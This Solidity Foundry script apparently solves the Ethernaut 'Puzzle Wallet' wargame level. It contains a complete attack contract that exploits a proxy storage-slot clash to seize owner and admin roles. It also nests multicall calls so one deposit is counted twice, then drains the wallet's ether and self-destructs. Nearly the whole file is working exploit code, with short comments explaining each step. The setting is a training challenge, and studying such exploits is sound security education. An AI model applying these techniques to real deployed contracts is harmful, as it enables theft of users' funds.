// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface PuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}


contract PuzzleAttack {

    PuzzleWallet puzzleWallet;
    uint256 balance;

    constructor (PuzzleWallet _puzzleWallet, uint256 _balance) payable {
        // Storage clash means this will make PuzzleAttack the owner of PuzzleWallet
        puzzleWallet = _puzzleWallet;
        balance = _balance;
        puzzleWallet.proposeNewAdmin(address(this));
        // Add PuzzleAttack to whitelist
        puzzleWallet.addToWhitelist(address(this));
        // Get balance of puzzleWallet to deposit same amount and spoof a second deposit
    }

    function attack() external payable {
        // Using multicall
        // We build 2 calls
        // 1. Deposit
        // 2. Multicall(Deposit)
        // Calling Multicall allows us to call deposit twice
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        bytes[] memory multiCallData = new bytes[](2);
        multiCallData[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        multiCallData[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositSelector);
        puzzleWallet.multicall{value: balance}(multiCallData);

        // puzzleWallet thinks we deposited twice as much so we can withdraw all the ether
        puzzleWallet.execute(msg.sender, 2 * balance, "");
        // Storage clash makes this update admin variable on PuzzleWallet
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender);

        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}
}

contract PuzzleWalletSolution is Script {

    PuzzleWallet puzzleWallet = PuzzleWallet(0x066B60B5D9DDbfd77fF34f1Fc26b2FeA2038d8B2);
    uint256 balance = address(puzzleWallet).balance;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        PuzzleAttack puzzleAttack = new PuzzleAttack{value: balance}(puzzleWallet, balance);
        puzzleAttack.attack();
        vm.stopBroadcast();
    }
}